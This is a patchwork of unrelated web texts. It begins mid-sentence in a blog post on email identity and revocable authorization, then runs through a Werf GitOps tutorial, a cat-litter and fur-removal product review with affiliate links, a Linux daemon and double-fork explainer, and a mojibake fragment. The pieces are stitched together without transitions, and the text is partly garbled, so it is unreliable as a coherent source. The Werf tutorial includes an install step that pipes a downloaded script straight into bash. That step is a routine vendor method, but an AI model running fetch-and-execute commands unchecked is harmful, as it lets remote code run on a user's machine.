solution (including DKIM). But this isn't really what you care about
with email and requiring email to carry some strong identification
doesn't solve the problem, as we've found out with all of the spam
email that has perfectly good DKIM signatures for some random new
domain.</p>

<p>(This is a version of <a href="https://utcc.utoronto.ca/~cks/space/blog/tech/TwoSidesOfIdentity">the two sides of identity</a>.
On the Internet people can trivially have multiple identities, so
while an identity is useful to only let selected people in, it's
not useful to keep someone out.)</p>

<p>I think that what you really care about with modern communication
protocols is <em>revocable authorization</em>. With a pull protocol, you
have this directly; you tacitly revoke authorization by stopping
pulling from the place you no longer like. With a push protocol,
you can still require authorization that you grant, which lets you
revoke that granted authorization if you wish. The closest email
comes to this is having lots of customized email addresses and
carefully using a different one for each service (which Apple has
recently automated for iOS people).</p>

<p>Obviously, requiring authorization to push things to you has a
fundamental conflict with any system that's designed to let arbitrary
strangers contact you without prearrangement (which is <a href="https://utcc.utoronto.ca/~cks/space/blog/spam/FundamentalSpamProblem">the
fundamental problem of spam</a>).
Modern protocols seem to deal with this in two ways (even with
revocable authorization); they have some form of gatekeeping (in
the form of accounts or access), and then they evolve to provide
settings that let you stop or minimize the ability of arbitrary
strangers to contact you (for example, Twitter's settings around
who can send you Direct Messages).</p>

<p>(The modern user experience of things like Twitter has also evolved
to somewhat minimize the impact of strangers trying to contact you;
for example, the Twitter website separates new DMs from strangers
from DMs from people you've already interacted with. It's possible
that email clients could learn some lessons from this, for example
by splitting your inbox into 'people and places you've interacted
with before' and 'new contacts from strange people'. This would
make DKIM signatures and other email source identification useful,
apart from the bit where senders today feel free to keep changing
where they're sending from.)</p>

<p>PS: In this view, actions like blocking or muting people on Twitter
(or the social network of your choice) is a form of revoking their
tacit authorization to push things to you.</p>

<p>This is the third post of a collection of GitOps tools articles. In this post, a continuous integration and continuous deployment tool for Kubernetes is reviewed:&nbsp;<strong>Werf</strong>. If you missed previous articles on GitOps tools, you could give them a read, as it will help you better understanding the general idea. <a href="https://kubesandclouds.com/index.php/2020/05/13/gitops/">ArgoCD</a> and <a href="https://kubesandclouds.com/index.php/2020/05/24/gitops-fluxcd/">FluxCD</a>, were the previously reviewed tools.</p>



<p>As for the previous tools, an example repository has been developed so that you can test Werf with some existing configurations. You can find the repository <a href="https://github.com/mifonpe/werf-kubesandclouds">here</a>.</p>







<h2>GitOps &amp; Werf ⛵</h2>



<p>GitOps is defined as a way of managing Kubernetes infrastructure and applications, in which git repositories hold the declarative definition of what has to be running in Kubernetes. A git repository is considered as the&nbsp;<em>single source of truth</em>&nbsp;in the GitOps model. With this approach, changes in the application definitions (code), are reflected on the infrastructure. Besides, it is possible to detect differences and drifts between the source controlled application and the different versions deployed.</p>



<p>GitOps allows faster delivery rates, as once the code is pushed to the production branch, it will be present in the cluster in a matter of seconds, increasing productivity. This Model also increases reliability, as rollbacks and recovery procedures are eased by the fact that the entire set of applications is control versioned by Git. Furthermore, stability and consistency is also improved.</p>



<p><a href="https://werf.io/">Werf</a> is an open source GitOps tool which aims to speed up application delivery by automating and simplifying the complete application lifecycle. To do so, Werf builds and publishes images, deploys applications to Kubernetes clusters, and removes unused images based on policies and rules defined in the Git repository.</p>







<p>Werf can build Docker images from Dockerfiles or using and alternative builder, which uses a custom syntax, and can support Ansible as well as incremental rebuilds based on Git history.</p>



<p>Werf deploys applications to Kubernetes using Helm-compatible charts with more extensive customizations. Furthermore, it provides rollout tracking, error detection and logging mechanisms for the application releases. The logic driving these mechanisms can be customized by means of Kubernetes annotations.</p>



<p>Werf is distributed as CLI written in go, so it can run virtually in any modern OS and it can be easily integrated with any CI/CD platform, as it has been developed to do so.</p>



<hr>



<h2>Installing Werf 💻</h2>



<p>In order to install Werf CLI, first you need to install Docker and Git in your machine. In case you haven’t installed them yet, you can find the installation instructions for Docker <a href="https://docs.docker.com/get-docker/">here</a>, and for Git <a href="https://git-scm.com/book/en/v2/Getting-Started-Installing-Git">here</a>. Once these dependencies are present, it’s time to install Werf.</p>



<p>Werf advises to install their CLI by means of the <a href="https://werf.io/documentation/guides/installation.html#method-1-recommended-by-using-multiwerf">multiwerf </a>utility, which ensures that the Werf CLI is always up to date. Execute the following commands to get it installed in your machine.</p>



<pre><code>export PATH=$PATH:$HOME/bin
echo 'export PATH=$PATH:$HOME/bin' &gt;&gt; ~/.bashrc
mkdir -p ~/bin
cd ~/bin
curl -L https://raw.githubusercontent.com/werf/multiwerf/master/get.sh | bash</code></pre>



<p>Select the Werf version to use and configure your terminal session to use that version by issuing the following command. Werf provides <a href="https://werf.io/releases.html">5 stability levels</a> to choose from, so that you can choose a level depending on your environments and needs.</p>



<pre><code>. $(multiwerf use 1.1 stable --as-file)</code></pre>



<p>In case you don’t want to use multiwerf features, you can just follow the ‘old good’ approach and get a specific version of the Werf CLI binary form <a href="https://werf.io/documentation/guides/installation.html#method-2-by-downloading-binary-package">here</a>.</p>



<hr>



<h2>Project structure 📁</h2>



<p>Werf expects files to be organized following a specific structure within the code repository. The image below shows the structure of the example repository that we will be using for this post, which contains a simple webpage (in <strong>/web</strong>) that is packaged in a nginx Docker image, and deployed to a Kubernetes cluster using Helm.</p>



<div><figure><img src="https://kubesandclouds.com/wp-content/uploads/2020/08/Screen-Shot-2020-08-31-at-9.47.02-AM.png" alt="" srcset="https://kubesandclouds.com/wp-content/uploads/2020/08/Screen-Shot-2020-08-31-at-9.47.02-AM.png 345w, https://kubesandclouds.com/wp-content/uploads/2020/08/Screen-Shot-2020-08-31-at-9.47.02-AM-300x257.png 300w" sizes="(max-width: 345px) 100vw, 345px"></figure></div>



<p>On the top level of the repository you can find <strong>werf.yaml</strong>, a YAML configuration file for Werf which defines how to build the images, and contains some metadata and directives that allow customizing the behavior of Werf. This file contains metadata information, images build information and artifacts build information each part separated by three hyphens. Werf also supports Go templates for the <strong>werf.yaml</strong> file, as you can notice in the last line of the following example, making configurations really powerful. Besides, by including different templates, <strong>werf.yaml</strong> can be split into different files, to better handle complex configuration scenarios.</p>



<pre><code>project: my-project
configVersion: 1
---
image: app
from: java:8-jdk-alpine
...
---
{{ include "artifact/appserver.tmpl" . }}</code></pre>



<p>At the same level you can find a <strong>Dockerfile</strong>, used to build the image. This <strong>Dockerfile</strong> can be directly referenced from<strong> werf.yaml </strong>to be used. However, Werf supports custom syntax to build images, directly specified within <strong>werf.yaml</strong> as you will see in the upcoming examples.</p>



<p><strong>.helm</strong> directory contains the Helm charts to be used by Werf to deploy the application, organized following the <a href="https://helm.sh/docs/topics/charts/#the-chart-file-structure">Helm chart file structure</a>. Notice that <strong>Chart.yaml</strong> is not included as it is not used by Werf.</p>



<hr>



<h2>Building images 📦</h2>



<p>First, clone the examples repository to get started.</p>



<pre><code>git clone https://github.com/mifonpe/werf-kubesandclouds.git
cd werf-kubesandclouds</code></pre>



<p>Building images from a Dockerfile is the easiest way to start using Werf in an already existing project. To do so, you will only need to add the<em> dockerfile </em>directive with the Dockerfile name (Dockerfile in this case) under the image config in your <strong>werf.yaml</strong> file.</p>



<pre><code>project: kyc-project
configVersion: 1
---
image: web-server
dockerfile: Dockerfile</code></pre>



<p>The code below shows the contents of the Dockerfile. It is fairly simple, as it just adds the webpage and its media to the image and exposes the port 80 fort the nginx server to listen on.</p>



<pre><code>FROM nginx:latest

COPY web/index.html /usr/share/nginx/html
COPY web/kyc.png /usr/share/nginx/html
EXPOSE 80 
CMD ["nginx", "-g", "daemon off;"]</code></pre>



<p>However, Werf provides advanced features for image building, eliminating the need for Dockerfiles, although they can be combined with the Werf builder syntax. Besides, you can build as many different images as you need using just one Werf configuration file (<a href="https://werf.io/documentation/guides/advanced_build/multi_images.html">multi-image build</a>). The code below shows the contents of the <strong>werf.yaml</strong> file of the <a href="https://github.com/mifonpe/werf-kubesandclouds">example repository</a>.</p>



<pre><code>project: kyc-project
configVersion: 1
deploy:
  helmRelease: werf-test
  helmReleaseSlug: false
  namespace: default
---
#image: web-server
#dockerfile: Dockerfile

image: werf-web
from: nginx:latest

ansible:
  install:
  - debug:
      msg: 'Start install'
  - file:
      path: /usr/share/nginx/html
      mode: 0755
  - file:
      path: /web
      state: directory
      mode: 0755
  - debug:
      msg: 'End install'
      
git:
- add: /web
  to: /usr/share/nginx/html
  owner: nginx
      
#shell:
#  beforeInstall:
#  - mkdir /web
  
docker:
  WORKDIR: /web
  CMD: ["nginx", "-g", "daemon off;"]
  EXPOSE: '80'
  ENV:
    BUILDER: werf-custom </code></pre>



<p>In this case, the image is built using different Werf directives. First, Ansible syntax is used with the <em>ansible</em> directive, to modify and create some directories. Shell commands can be executed during the building phase with the <em>shell</em> directive, however, when using <em>ansible</em> directives, <em>shell</em> directives cannot be used and vice versa. Notice the commented <em>shell</em> directive as an example.</p>



<p>Blocks inside the <em>ansible</em> and <em>shell</em> directives are known as Werf assembly instructions. Werf provides four user stages for executing these instructions: <em>beforeInstall</em>,&nbsp;<em>install</em>,&nbsp;<em>beforeSetup</em>, and&nbsp;<em>setup</em>. They are executed respectively, one after another. If you want to know more about user stages and the wide range of possibilities they offer, check<a href="https://werf.io/documentation/configuration/stapel_image/assembly_instructions.html#what-are-user-stages"> this documentation</a>.</p>



<p>The <em>git</em> directive is used to add files from the local Git repository into the image, but it can be used to add files from remote repositories too, allowing you to specify the branch, tag or commit to use, as well as path-based filters. Besides, this directive can be used to trigger the rebuilding of images when specific changes are made inside a Git repository. To see a comprehensive description of the directive and its capabilities, check <a href="https://werf.io/documentation/configuration/stapel_image/git_directive.html">this documentation</a>.</p>



<p>Finally, the <em>docker</em> directive is used following a Dockerfile-like syntax in order to build the image. You can check the details of this directive <a href="https://werf.io/documentation/configuration/stapel_image/docker_directive.html">here</a>.</p>



<p>To build your docker image, you just need to execute the following command within the root level of your repository, so that the CLI can find the <strong>werf.yaml</strong> file. Note the <em>–stages-storage</em> flag, which indicates to Werf where to store the built <a href="https://werf.io/documentation/reference/stages_and_images.html#stages">stages</a>, which are the intermediate layers that are used to generate the image. In this case, by using the local flag, Werf will store the stages using the local docker runtime.</p>



<pre><code>werf build --stages-storage :local</code></pre>



<p>During the build process, the different stages are executed and their outputs are shown in the terminal.</p>

<p>Once the image is built successfully, you can push it to an images repository. For this example I used a <a href="https://hub.docker.com/">Dockerhub</a> public repo for simplicity. If you don’t have an account yet, just sign up and create a public repository. Once it’s ready, generate an access token so that Werf can push the built images to the repository. To push the image, issue the following command.</p>



<pre><code>werf publish --stages-storage :local --images-repo &lt;your-repo&gt;  --tag-custom v0.0.1  --images-repo-docker-hub-token  &lt;your-token&gt;</code></pre>



<div><figure><img src="https://kubesandclouds.com/wp-content/uploads/2020/08/Screen-Shot-2020-08-31-at-3.56.49-PM.png" alt="" srcset="https://kubesandclouds.com/wp-content/uploads/2020/08/Screen-Shot-2020-08-31-at-3.56.49-PM.png 883w, https://kubesandclouds.com/wp-content/uploads/2020/08/Screen-Shot-2020-08-31-at-3.56.49-PM-300x75.png 300w, https://kubesandclouds.com/wp-content/uploads/2020/08/Screen-Shot-2020-08-31-at-3.56.49-PM-768x191.png 768w" sizes="(max-width: 883px) 100vw, 883px"></figure></div>



<p><strong>TIP:</strong> If you prefer using a local Docker repository, rather than using Dockerhub, you can just run the following command, and specify <em>–images-repo localhost:5000/your-repo-name</em> when issuing the <em>werf publish</em> command.</p>



<pre><code>docker run -d -p 5000:5000 --restart=always --name registry registry:2</code></pre>



<p><strong>TIP 2:</strong> You can build and publish your image by just using one command.</p>

		<p>I love my two cats dearly and they bring a lot of joy to my life, but they also bring other things, like poop, and fur.&nbsp; When I tried to research mitigations for any of these it was 100% SEO listicles, so I’m sharing my raw data in the hopes that the next person can find something real-if-incomplete instead of a list of every automated litter box that has ever been manufactured.</p>
<p>I wrote the bulk of this in February, but then one of the cats developed dermatitis and I put it on pause until I could make sure it wasn’t caused by anything on this list. Alas, it wasn’t, she’s just allergic to my new apartment. But then I wanted to test something else, and suddenly six months had passed. So if the tenses seem weird, that’s why.</p>
<p>(Links are affiliate links when possible)</p>

<p>I screwed up choosing my new apartment (this was written before the allergy thing). I remembered to check for space to put the litter box in the bathroom, but in my joy at finding a place that allowed that at all after so many that did not,&nbsp; I forgot to check if that space was also where you stood to wash your hands. So I ended up having to put the box in the living room. I’ve done that before and didn’t want to go back to having to keep the window open year round and still smelling poop. I also didn’t love the aesthetic.&nbsp; So I set up something kind of elaborate.</p>
<h2><a href="https://kittyvent.com/products/kitty-vent">KittyVent Litter Box Ventilator</a></h2>
<p>This is a long piece of hosing with a gentle fan in it, and a plastic thingy to block off a window that has a hole for the hose to connect to (similar to what you’d use for a portable air conditioner)</p>
<p><img src="https://cdn.shopify.com/s/files/1/2969/4434/products/IMG_0842_075fb887-2c88-400b-9bc8-3973573e3915_1024x1024@2x.jpg?v=1545953794" width="423" height="282"></p>
<p>The window-blocking thing works vertically but won’t stay up on its own, I had to tape it. The fan is extremely quiet, you can’t tell it’s on from more than six inches away. I’m very sure it works because the first time I noticed a smell, I found the fan had been turned off.</p>
<p>There are instructions for how to DIY this available online (e.g. <a href="https://www.instructables.com/id/Cat-Litter-Box-Odor-Eliminator-Fan-FlowCat/">here</a>), but I just bought it and it worked fine.</p>
<h2>Litterbox Holding End Table</h2>
<p>To make it less hideous, I got an end table designed to hold a litter box. Amazon is full of these, but most have only a single entrance and no ventilation. I assume these are aimed at people who haven’t thought things through. I wanted something I could connect a vent to and actually get rid of the smell. You might be able to cut a hole in one of the ventless ones to attach the hose to but I didn’t feel like bothering, so I got one with ventilation.</p>
<p><img src="https://images-na.ssl-images-amazon.com/images/I/91iP7ZrigoL._AC_SL1500_.jpg" width="443" height="420"></p>
<p>I chose ecoFlex (<a href="https://www.amazon.com/gp/product/B01BM8E4KK/ref=as_li_qf_asin_il_tl?ie=UTF8&amp;tag=acesoundergla-20&amp;creative=9325&amp;linkCode=as2&amp;creativeASIN=B01BM8E4KK&amp;linkId=12a658675d21d4d4f9cad298d5ba2314">affiliate link</a>)&nbsp; because matched my it existing furniture and was the only option with both ventilation holes and a second shelf. For this, I accepted it being really much larger than it needed to be. Also the copytext said something about liquid-proof, non-smell-absorbant material, although who knows how true that is. Then I packing taped the ventilation hose to a hole in the back that wasn’t shown in the pictures, apparently intended for electric cords to automated litter boxes.</p>
<p>My cats adapted stupidly well to this- when I set up the litter box with the door open, they both used it within 10 minutes, despite their other litter box still being available. They did just as well when I closed the door.</p>
<p>Some litter does escape the table, so have a plan for that.</p>
<h2>Dog Poop Bags</h2>
<p>My weird conservation instincts push me not to empty the litter box until I can fill a bag. Otherwise I’m wasting valuable bag. So I bought a bunch of very small, very cheap bags and stored them in that shelf in the litter box end table, which is why I wanted it so much. I chose Amazon Basics Dog Poop Bags (<a href="https://www.amazon.com/gp/product/B00NABTGY2/ref=as_li_qf_asin_il_tl?ie=UTF8&amp;tag=acesoundergla-20&amp;creative=9325&amp;linkCode=as2&amp;creativeASIN=B00NABTGY2&amp;linkId=4d1641dea9b445b48539e119879ecada">affiliate link</a>) based on WireCutter’s <a href="https://thewirecutter.com/reviews/best-dog-poop-bags/">recommendation</a> and so far they are resoundingly fine.</p>
<h2>Dr Esley Cat Litter (<a href="https://www.amazon.com/gp/product/B07L9WFY14/ref=as_li_qf_asin_il_tl?ie=UTF8&amp;tag=acesoundergla-20&amp;creative=9325&amp;linkCode=as2&amp;creativeASIN=B07L9WFY14&amp;linkId=37e0a6f0fb2ce49f0ba47c52c36791d7">affiliate link</a>)</h2>
<p>I got this because Sweethome recommended it. I didn’t appreciate how much better it was working until a delivery screw up made me use <a href="https://www.amazon.com/gp/product/B06ZZYMWVT/ref=as_li_qf_asin_il_tl?ie=UTF8&amp;tag=acesoundergla-20&amp;creative=9325&amp;linkCode=as2&amp;creativeASIN=B06ZZYMWVT&amp;linkId=e9f8cccc7ed36fc1765011ac565da4d4">Arm and Hammer</a> and there started to be a smell where there hadn’t been before.</p>

<h2><a href="https://www.litter-robot.com/litter-robot-3.html">Litter Robot 3</a></h2>
<p>This is so close to being a truly great product, but isn’t quite reliable enough to be the only litter box. It had a tendency to get stuck in an unusable position, which eventually forces the cats to go elsewhere. The drawer the poop stays in doesn’t completely contain the smell. Also the range of litter between “excess will get dumped” and “too low” is uncomfortably thin. I’d still recommend it as a second litter box to cut down on scooping, or in a populous household where there will always be someone to turn it off and on again.</p>
<h2>Two Layer Litter Mat (<a href="https://www.amazon.com/gp/product/B00G67FD6W/ref=as_li_qf_asin_il_tl?ie=UTF8&amp;tag=acesoundergla-20&amp;creative=9325&amp;linkCode=as2&amp;creativeASIN=B00G67FD6W&amp;linkId=9e1bbec26c9a003b834013f6cbb1bc7d">affiliate link</a>)</h2>
<p><img src="https://images-na.ssl-images-amazon.com/images/I/81BjAf-AA6L._AC_SL1000_.jpg"></p>
<p>This actually worked great at its stated purpose of catching litter the cats track out of the box, but when the cats pooped on it (say, because the litter box had been upside down for six hours), it was almost impossible to clean, especially if I caught it less than instantly. Plus it is ugly.</p>
<h2>Open Window with a Fan</h2>
<p>This was definitely better than not having an open window with a fan, but there’s no comparison between it and the vent-with-hose.</p>


<h2>Silicone Grooming Gloves (<a href="https://www.amazon.com/gp/product/B01N9KSITZ/ref=as_li_qf_asin_il_tl?ie=UTF8&amp;tag=acesoundergla-20&amp;creative=9325&amp;linkCode=as2&amp;creativeASIN=B01N9KSITZ&amp;linkId=cf4e5b0147e03c93e42da573c5afaf32">affiliate link</a>)</h2>
<p><img src="https://images-na.ssl-images-amazon.com/images/I/713JHXyZS9L._AC_SL1000_.jpg" width="356" height="321"></p>
<p>These collect a lot of hair, plus their squishiness means you can brush bony areas that would be a problem for a metal comb. The cats start purring the instant I pet them with these.</p>
<p>Downside: kind of a pain to get the hair off the glove, does not pick up 100% of the fur it loosens, so be sure to use it somewhere easy to vacuum or at least not your own lap.</p>

<h2>The Dryer</h2>
<p>Turns out dryers are reasonably good at removing cat hair if you wait long enough. Remember to clean the lint trap frequently.</p>
<h2>Reusable Lint Roller</h2>
<p>I tried two made of the same material- a paddle shaped one (<a href="https://www.amazon.com/gp/product/B07SBM761G/ref=as_li_qf_asin_il_tl?ie=UTF8&amp;tag=acesoundergla-20&amp;creative=9325&amp;linkCode=as2&amp;creativeASIN=B07SBM761G&amp;linkId=94a8f23a77ace6722af2df51d72f696b">affiliate link</a>)</p>
<p><img src="https://images-na.ssl-images-amazon.com/images/I/71Dh0-dIIwL._SL1467_.jpg" width="341" height="324"></p>
<p>and a more traditional roller shaped one (<a href="https://www.amazon.com/gp/product/B00BAGTNAQ/ref=as_li_qf_asin_il_tl?ie=UTF8&amp;tag=acesoundergla-20&amp;creative=9325&amp;linkCode=as2&amp;creativeASIN=B00BAGTNAQ&amp;linkId=cb9987743b51a7b5feea72739bf6ac92">affiliate link</a>)</p>
<p><img src="https://images-na.ssl-images-amazon.com/images/I/61VbLSzuCrL._SL1500_.jpg" width="340" height="272"></p>
<p>Of these, I found the wand shaped one easier to use, and the roller easier to clean. I prioritized use, but your mileage may vary. Also, you need to actually read the instructions on how to use it, running it back and forth like disposable lint roller just redistributes the hair.</p>
<p>Here is a picture of a pillow after I ran the paddle shaped one over part of it several times. I think this gives a good idea of what it’s capable of, i.e. it’s a significant improvement but doesn’t get everything.</p>
<p><img src="https://lh3.googleusercontent.com/CdwlDpVYOYR7uoDoi2G-hNc8DLvvdJcuKTEiekukqxS_Ao3h9i5dMpu5j-s6GWrwGTe-34ILa7rc-Y83frrUc5SpqWEqErREaYHV8QACkzN1Qc7ziND_ZkQ7bPRcB2J6jcr9cxcOWwBpDKwT-zVo5dalEK1QTcm5cntNpZpe213JKFvj0cH-3aSXp9gjvW_yvmj_PRXNWBOEbkCwYiz_sVkrhebNvKv48qHgcu0hq7P-cW5DGbFncCoHJYGk0hn5zUSJGTfBZycsdWoq9wwXV3fepvtl8koVwGgAZTu-eGAifmoPK1RIQurOfZd8aYCANtifgD21PKFn0UTrFUx6gJ1paCdQ2uEVuYunpuxPVALjhQddhCI74D525eMhQ2b7-pj7q74Q9s-DI1_DHsmdvxwlGAzbPKowjkgj_XCi3kcq6MgV4ApNaZvSE89ZV3dok7peQEkh3WdP6p_V5WZbTMLdxwSqrUWU2gWNgt5R9Su6mxnSad_vpkMcSmCmln5j5aLfC0hBCOPWtYBiZ20pr0x9q2atPvG6kUhElanjCNtJBYvsgewnqxSCbzqB0tcfJ3UNFuETuFCgQ_kSU_5JMMeqa2oi94i1GH2Gogjm9wMKO3iruENNYaRmHW-9ogCsfvOHPPP558lJu78AOFY3Ld2zEjEfijgu22QP1U3vxkZBFGR_fKbfkvI=w1760-h1320-no" width="340" height="255"></p>
<p>Note: inbetween writing this and publishing, the paddle brush people offered me actual money to publish a review, which I plan on taking them up on, assuming I can find the form.</p>
<h2>Shark Pet-Perfect II Handheld Vacuum (<a href="https://www.amazon.com/gp/product/B0037HHFMO/ref=as_li_qf_asin_il_tl?ie=UTF8&amp;tag=acesoundergla-20&amp;creative=9325&amp;linkCode=as2&amp;creativeASIN=B0037HHFMO&amp;linkId=4140bcc636b3132e9c69552f56ebb21e">affiliate link</a>)</h2>
<p>Sweethome’s top handheld vacuum pick was sold out everywhere and their second is specifically called out as being bad at fur, so I selected based on Amazon reviews. As a vacuum cleaner it is Not Fucking Around- it is super powerful and sucks anything off my floors. It advertises a special whirling brush aimed specifically at pet hair, but I found it choked on soft surface I tried it on, and the bristles were better. The biggest complain on Amazon was the battery life, but I got it for spot cleaning not marathons, so it’s been fine and I appreciate not paying for a feature I don’t use.</p>
<p>All of the anti-cat-hair devices work better if I stay very on top of them. Given time, the fur works itself deeper into the fabric and nothing will work except picking it out with actual human fingers.</p>

<h2>The Furminator (<a href="https://www.amazon.com/gp/product/B07MZLNVSW/ref=as_li_qf_asin_il_tl?ie=UTF8&amp;tag=acesoundergla-20&amp;creative=9325&amp;linkCode=as2&amp;creativeASIN=B07MZLNVSW&amp;linkId=ea4961e2a9d1ed7f9540a55d8364f886">affiliate link</a>)</h2>
<p>This is another one that was great at its official objective but failed a secret objective. It was absolutely amazing at removing fur from the cats (on areas broad and unbony enough to support the comb), and they liked it, but it left them less soft. I did not get these cats to have them at less than their maximum softness.</p>
<h2><span>Rubber Thingies You Throw in the Washer and Dryer&nbsp;</span></h2>
<p><img src="https://images-na.ssl-images-amazon.com/images/I/71uRMoJP33L._AC_SL1500_.jpg" width="402" height="402"></p>
<p>I ran an experiment and as far as I can tell these are no better than just running an article through the dryer. Before/after photos (which I unfortunately didn’t save) didn’t show more hair being removed and the thingies are completely free of hair after many uses, which suggests to me they’re not helping much.</p>
<p>I tried wetting them and running them over a pillow case and they indeed picked up something, so I’m leaving them in my washer just in case.</p>
<p>I used LEADTEAM (<a href="https://www.amazon.com/gp/product/B07THZ68TT/ref=as_li_qf_asin_il_tl?ie=UTF8&amp;tag=acesoundergla-20&amp;creative=9325&amp;linkCode=as2&amp;creativeASIN=B07THZ68TT&amp;linkId=8efe81ab9e97d47fa558f5f04ff3d1f9">affiliate link</a>) and didn’t test any others, they looked identical.</p>

<p><img src="https://images-na.ssl-images-amazon.com/images/I/410dKWoCFkL._AC_.jpg" alt="Smart Sheep Reusable Wool Dryer Balls, 3-Pack" width="337" height="320"></p>
<p>Testing the dryer inserts is difficult because it’s really hard to get a control group. I can’t put in half a blanket and see what the other half does. I can’t even use my two identical blankets, because they’re not guaranteed to have identical amounts of hair on them. I tried with socks but was kind of out of patience by that point. I was pretty confident the rubber ones were doing nothing, but despite a really silly amount of rigor involving photos and test swabs with the lint roller, I just can’t tell with these.</p>
<h2>Disposable Lint Rollers</h2>
<p>These were better than nothing but not as good as the reusable roller.</p>

<p>My cats were never great at eating but had gotten to the point where between the two of them someone was vomiting almost every day without cause (cause = “I went too long without eating”, “I ate too fast because I went too long without eating” and hairballs), and one had lost a noticeable amount of weight (her current weight would be fine if she’d started there, but losing almost 20% of her body weight for no known reason is concerning). There was also behavior that made me think they didn’t like their food- things like persistently begging and then when I put new food down, sniffing it, looking upset and begging more. So I talked to the vet.</p>

<p>I started both of these at the same time and now the cats are down to vomiting once a week, tops, some of which is for cause. They don’t love the prescription food by they will eat it. They’re fine with the vitamins.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="mainEntityOfPage">
		
<p>In this article, we’ll take a closer look at daemons. We’ll understand exactly what they are, how they’re implemented, and the scope of their responsibility.&nbsp;</p>



<h2><strong>Overview</strong></h2>



<p>Simply put, a daemon (pronounced dee-mon) is an intentionally orphaned background process. Additionally, daemons are detached from the terminal in which they’re spawned, operate without user interaction, and are descendants of the system’s init process.</p>



<p>Daemons will silently wait in the background for specific events to occur or conditions to be met before executing.</p>



<p>At boot time, Linux will start the init process (init is itself a daemon) which will serve as the parent of all processes and assign it PID 1 (process identification number). It’s important to mention that the init function is a special process that is not attached to any terminal.</p>



<p>After the boot sequence is complete, Linux will start up any previously declared daemons. These will be created through a series of fork() and exit() commands which will intentionally create an orphaned process that will eventually be adopted by the init process – more on this soon.</p>



<h2><strong>Use Cases</strong></h2>



<p>Conventionally, daemon process names end with the letter “d”. If you’re interested in seeing all daemons installed on your Linux machine, use this command:</p>



<p><code>service --status-all</code></p>



<p>You’ve certainly encountered daemons whether you were aware of them or not:&nbsp;</p>



<ul><li>A web server is simply a process that runs continuously in the background waiting to process and respond to HTTP requests (http daemon)</li><li>sshd is the dameon responsible for SSH operations</li><li>“MAILURE_DEMON” is a daemon that notifies the sender of invalid email recipients&nbsp;</li><li>Monitoring hardware activity like hard drive health&nbsp;</li><li>cron jobs</li></ul>



<h2><strong>Implementation</strong></h2>



<p>We’ll take a look at the code to create a daemon shortly, but let’s establish some basics first.&nbsp;</p>



<p>Calling the fork() function creates a new process referred to as the child process. The child process runs in parallel with the process that triggered the fork() (the parent process).&nbsp;</p>



<p>A child process shares the same program counter and CPU registers as its parent. So, when a new child process is created, both the child and parent processes will execute the next instruction after the fork() call in parallel.&nbsp;</p>



<p>Here’s a simple example from Michigan Tech:&nbsp;</p>



<div><figure><img src="https://lh5.googleusercontent.com/Q9blfMxaFBFWjoLw_h9HxBAJYRhW5WO6ws4atHZKsY-6Bf5y9bu-EBQJ7qJ8F_piFCvK6wct0U-l9ykXRpt1DZZy_XdJZRCjnjx7WNjLpQu8sx59rsdAxQ25y-PGCJdGJ_VvpzwL" alt="" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure></div>



<p>After fork(), both the parent and the child processes execute the following code in parallel.</p>



<div><figure><img src="https://lh3.googleusercontent.com/OeO_ztEonrxuE5Lw-N_7YS-3gOl0G0h8lQHUdax3632W6aooeiDSf7wOBIGU1aqyF_yCs6hnHv1IqJxtreeTsS_mkdukzMqcfbw2wPp_eEisclimHbtDUC45tetfvxQ_moeOVIvb" alt="" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure></div>



<p>You can also make their execution paths differ if desired. If the fork() call succeeds, the PID of the child process is returned in the parent, and 0 is returned in the child.&nbsp;</p>



<p>In order to create a daemon, we’ll fork() to create a child process and then exit() the parent. This, as previously mentioned, will purposefully create an orphaned process that will be adopted by init. </p>



<p>Our new daemon is now free to sit silently in the background outside of any terminal and perform its task.</p>



<p>While this is a practical understanding, the actual implementation is a bit more nuanced. </p>



<p>We’ll need to make sure to do the following:</p>



<ul><li>Close all open file descriptors</li><li>Change the working directory</li><li>Separate from the terminal and ignore I/O signals</li><li>Disassociate from the process group and control terminal</li><li>Don’t reacquire a control terminal </li><li>Reset the file access creation mask</li></ul>



<p>The following implementation is inspired by Pascal Werkl’s work. I’ve added additional documentation to make it more approachable for someone that is unfamiliar with C and/or Linux systems. I encourage you to <a href="https://github.com/pasce/daemon-skeleton-linux-c/">checkout the original code here</a>.</p>







<h2>Understanding the double fork()</h2>



<p>Let’s try and understand why we need 2 fork() calls in the code above.&nbsp;</p>



<p>When we run this program in the terminal, several environmental settings – specifically the shell we’re working in – are replicated to our child process. So, we’ll need to disassociate our daemon from its spawning terminal.</p>



<p>That’s why we call <code>setsid()</code> and create our own independent session for the child process. </p>



<p>However, in doing so, this child process will be in its own session and process group and therefore it’ll be its own session leader. The main takeaway here is that there is potential for the session leader to reacquire a terminal later on (i..e. if say the user were to open up another terminal). </p>



<p>We don’t want that. Remember, we want to be completely independent of the terminal and any user-input.</p>



<p>By calling fork() a second time, we ensure that this new process (fork-2) will have a PID outside the bounds of fork-1’s session. Since we are not calling <code>setsid()</code> on the fork-2 process, no new session is being made. In other words, we know that fork-2 is <em><strong>not</strong></em> a session leader and therefore there’s no risk of it acquiring a terminal in the future. </p>



<p>Finally, by killing fork-2’s parent, we know that we’ve created an orphaned process that is adopted by init and can’t reacquire a terminal or be affected by user input.</p>



<blockquote><p>TLDR: The 2 fork() calls removes any chance of the daemon reacquiring a controlling terminal and helps ensure that the daemon is re-parented onto init. </p><p>If the use of the secondary fork() isn’t clear, don’t worry – it’s more to do with handling a potential edge case in the environment than a necessity in a generic daemon implementation.</p></blockquote>



<h2><strong>Wrapping Up</strong></h2>



<p>Thanks for checking out this article! If you have any topic requests, please contact me or leave a comment below!</p>



<p>If you’re interested in seeing all installed daemons on your machine, use this command on Linux machines:&nbsp;</p>



<p><code>service --status-all</code></p>



<blockquote><p>Remember daemon names generally end in “d”</p></blockquote>

<p>Only much later could I count the mistakes in that statement. No, it wouldnâ€™t take â€˜just a secondâ€™; no, I didnâ€™t â€˜needâ€™ to respond to the email â€“ Iâ€™m an author and researcher, and thus rarely receive messages that have a drop-everything-and-answer urgency to them. And no, it wouldnâ€™t be â€˜one thingâ€™. My brain would be too tempted, Iâ€™d feast on it all.</p>
